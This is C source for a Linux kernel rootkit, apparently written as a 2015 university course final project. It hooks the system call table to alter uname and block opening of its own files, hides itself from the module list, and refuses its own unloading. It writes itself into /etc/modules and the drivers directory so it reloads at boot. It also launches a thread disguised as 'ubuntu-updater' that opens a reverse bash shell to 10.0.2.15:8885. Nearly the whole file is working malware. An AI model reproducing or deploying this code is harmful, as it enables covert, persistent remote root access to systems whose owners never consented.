/*
* This kernel module locates the sys_call_table by scanning
* the system_call interrupt handler (int 0x80)
*
* Author: Elliot Bradbury 2010
* 
* Modified by: Hiroshi Fuiji
*	       David Jiang
*	       Alex Mitsdarfer
*	       Shareefah Williams
*
* For CS 460 - Spring 2015 Final Project.
*/

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <linux/utsname.h>
#include <asm/pgtable.h>

#include <linux/file.h>
#include <linux/fs.h>
#include <linux/buffer_head.h>
#include <asm/segment.h>
#include <linux/slab.h> // used for kmalloc
#include <linux/syscalls.h>
#include <linux/kmod.h> // for execv... for realz this time

// payload business
#include<linux/kthread.h>
#include<linux/sched.h>

MODULE_LICENSE("GPL");

// see desc_def.h and desc.h in arch/x86/include/asm/
// and arch/x86/kernel/syscall_64.c

typedef void (*sys_call_ptr_t)(void);
typedef asmlinkage long (*orig_uname_t)(struct new_utsname *);

// my attempt at hooking open
typedef asmlinkage long (*orig_open_t)(const char *filename, int flags, int mode);
typedef asmlinkage long (*orig_execve_t)(const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp);
typedef asmlinkage long (*orig_delete_module_t)(const char *name, int flags);


void persist(void);
void activateInvisibilityCloak(void);

struct file* file_open(const char* path, int flags, int rights);
void file_close(struct file* file);
int file_write(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size);
int file_read(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size);


struct task_struct *task;

int thread_function(void)
{
	int var;

	char *argv[]={"/bin/bash","-c", "/bin/bash -i > /dev/tcp/10.0.2.15/8885 0<&1 2>&1", NULL};
	char *envp[]={"HOME=/","TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/bin:/usr/bin"};

 	var = 10;

	call_usermodehelper(argv[0],argv,envp, UMH_WAIT_EXEC);

	while(!kthread_should_stop())
	{
	     schedule();
	}

	return var;
}


void activateInvisibilityCloak(void)
{
	list_del_init(&__this_module.list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
}





// fptr to original uname syscall
orig_uname_t orig_uname = NULL;
orig_open_t orig_open = NULL;
orig_execve_t orig_execve = NULL;
orig_delete_module_t orig_delete_module = NULL;

// test message
char *msg = "I want to get off Mr. Bone's Wild Ride.";

asmlinkage long hooked_uname(struct new_utsname *name) {
    orig_uname(name);
    
    strncpy(name->sysname, msg, 39);

    return 0;
}

asmlinkage long hooked_open(const char *filename, int flags, int mode)
{
	int fd;

	// alternative to strcmp() in case not in working directory
	// strstr(string_to_scan, sequence_to_match)
	// returns NULL if no match
	
	// if there's no match to /proc/modules and no match /sys/modules (we want those to run)
	// then check for files we don't want opened
	if( strstr(filename,"/proc/modules") == NULL && strstr(filename,"/sys/modules") == NULL )
	{
		if( strstr(filename,"rootkit") != NULL ||

		    strstr(filename,"modules") != NULL )
		{
		    printk("lolnope\n");
		    return -1;
		}
	}

	fd = orig_open(filename, flags, mode);

	return fd;
}

asmlinkage long hooked_delete_module(const char *name, int flags){
	char my_module[] = "rootkit";
	if (strcmp(name, my_module) != 0){
		printk("Deleting module name: %s\n", name);
		return orig_delete_module(name, flags);
	}
	else{
		printk("Not deleting module name: %s\n", name);
		return 0;
	} 
}

// and finally, sys_call_table pointer
sys_call_ptr_t *_sys_call_table = NULL;

// memory protection shinanigans
unsigned int level;
pte_t *pte;

// initialize the module
int init_module() {
    int mysterious_data;
    
    // struct for IDT register contents
    struct desc_ptr idtr;

    // pointer to IDT table of desc structs
    gate_desc *idt_table;

    // gate struct for int 0x80
    gate_desc *system_call_gate;

    // system_call (int 0x80) offset and pointer
    unsigned int _system_call_off;
    unsigned char *_system_call_ptr;

    // temp variables for scan
    unsigned int i;
    unsigned char *off;

    activateInvisibilityCloak();

    printk("+ Loading module\n");

    // store IDT register contents directly into memory
    asm ("sidt %0" : "=m" (idtr));

    // set table pointer
    idt_table = (gate_desc *) idtr.address;

    // set gate_desc for int 0x80
    system_call_gate = &idt_table[0x80];

    // get int 0x80 handler offset
    _system_call_off = (system_call_gate->a & 0xffff) | (system_call_gate->b & 0xffff0000);
    _system_call_ptr = (unsigned char *) _system_call_off;

    // scan for known pattern in system_call (int 0x80) handler
    // pattern is just before sys_call_table address
    for(i = 0; i < 128; i++) {
        off = _system_call_ptr + i;
        if(*(off) == 0xff && *(off+1) == 0x14 && *(off+2) == 0x85) {
            _sys_call_table = *(sys_call_ptr_t **)(off+3);
            break;
        }
    }

    // bail out if the scan came up empty
    if(_sys_call_table == NULL) {
        printk("- unable to locate sys_call_table\n");
        return 0;
    }

    // now we can hook syscalls ...such as uname
    // first, save the old gate (fptr)
    orig_uname = (orig_uname_t) _sys_call_table[__NR_uname];
    orig_open = (orig_open_t) _sys_call_table[__NR_open];
    orig_execve = (orig_execve_t) _sys_call_table[__NR_execve];
    orig_delete_module = (orig_delete_module_t) _sys_call_table[__NR_delete_module];

    // unprotect sys_call_table memory page
    pte = lookup_address((unsigned long) _sys_call_table, &level);

    // change PTE to allow writing
    set_pte_atomic(pte, pte_mkwrite(*pte));

    // now overwrite the __NR_uname entry with address to our uname
    _sys_call_table[__NR_uname] = (sys_call_ptr_t) hooked_uname;
    _sys_call_table[__NR_open] = (sys_call_ptr_t) hooked_open;
    _sys_call_table[__NR_delete_module] = (sys_call_ptr_t) hooked_delete_module;

    printk("+ module successfully loaded!\n");

    // Part of initialization:
    // so that we insert module again on boot
    persist();

    mysterious_data = 20;
    task = kthread_run(&thread_function,(void *)mysterious_data,"ubuntu-updater"); // totally not an ubuntu updater

    return 0;
} 

/*
    This is an attempt to allow this module to reinstall on system reboot

    1. Append module name to /etc/modules (gets checked for which files we want to install on boot)
    2. Copy this .ko to a directory that will be searched in order to install. In this case, /lib/modules/3.16.0-30-generic/kernel/drivers/watchdog/<file_name.ko>
    3. Run userland program "depmod" (as sudo) to set up correct configs and dependencies
    4. ???
    5. Profit.
*/
void persist()
{
    // For writing the module name to /etc/modules
    struct file *f;
    char *this_module = "rootkit\n";
    int bytes;
    int offset;
    // Used for copying the .ko
    struct file *fread, *fwrite;
    // Copy rootkit.ko to /lib/modules/3.16.0-30-generic/kernel/drivers/watchdog
    char *driver_dest = "/lib/modules/3.16.0-30-generic/kernel/drivers/watchdog/rootkit.ko";
    char *driver_src = "rootkit.ko";
    // Used in .ko copy to /watchdog
    char temp_buf[1];
    // Used while calling userland depmod. This MUST be called as sudo
    // For mystical reasons, depmod must be sudo'd, even while running as root
    char *envp[] = { "HOME=/", NULL };
    char *argv[] = { "/bin/su", "-c" , "depmod", NULL };


    // Step 1.
    // O_APPEND appends to end of file, flag field should be ignored
    f = file_open("/etc/modules",O_RDWR|O_APPEND, 0600);
    bytes = 0;
    offset = 0;
    if(f != NULL)
    {
	file_write(f,0,this_module,10);
	file_close(f);
    }
    else
    {
	// it's okay that if fails on reboot - at that point
	// it doesn't matter - we are able to run at boot and so don't
	// need to write again
        printk("- Failed to open modules\n");
    }
 
    // Step 2.
    fwrite = file_open(driver_dest,O_WRONLY|O_CREAT, 0600);
    fread = file_open(driver_src, O_RDONLY, 0600);

    if(fwrite != NULL && fread != NULL)
    {
        offset = 0;
        bytes = 1;
        while(bytes != 0)
        {
	    // make sure last parameter is size of temp_buf
            bytes = file_read(fread, offset, temp_buf, 1);
      	    if(bytes != 0) file_write(fwrite,offset,temp_buf,1);
            offset += bytes;
        }
        file_close(fwrite);
        file_close(fread);
    }
    else
    {
        printk("- driver write failed\n");
    }

    // Step 3.
    // depmod to get the module set up for install on reboot
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

void cleanup_module() {

    kthread_stop(task);

    if(orig_uname != NULL)
    {
        // restore sys_call_table to original state
        _sys_call_table[__NR_uname] = (sys_call_ptr_t) orig_uname;
    }
    if(orig_open != NULL)
    {
	_sys_call_table[__NR_open] = (sys_call_ptr_t) orig_open;
    }
    if(orig_execve != NULL)
    {
	_sys_call_table[__NR_execve] = (sys_call_ptr_t) orig_execve;
    }   // reprotect page - May need to protect with NULL checks on orig_* funcs
    if( orig_uname != NULL || orig_open != NULL || orig_execve != NULL)
    {
        set_pte_atomic(pte, pte_clear_flags(*pte, _PAGE_RW));
    }
    
    printk("+ Unloading module\n");
}

// Perfectly legitimate file operations are going on below here.
// No need to panic, everything is fine.
// Nothing a module shouldn't be doing.

struct file* file_open(const char* path, int flags, int rights)
{
        struct file* filp = NULL;
        mm_segment_t oldfs;
        int err = 0;

        oldfs = get_fs();
        set_fs(get_ds());
        filp = filp_open(path, flags, rights);
        set_fs(oldfs);
        if(IS_ERR(filp))
        {
                err = PTR_ERR(filp);
                return NULL;
        }
        return filp;
}


void file_close(struct file* file)
{
        filp_close(file, NULL);
}

int file_write(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size)
{
        mm_segment_t oldfs;
        int ret;

        oldfs = get_fs();
        set_fs(get_ds());

        ret = vfs_write(file, data, size, &offset);

        set_fs(oldfs);
        return ret;
}

int file_read(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size)
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_read(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}
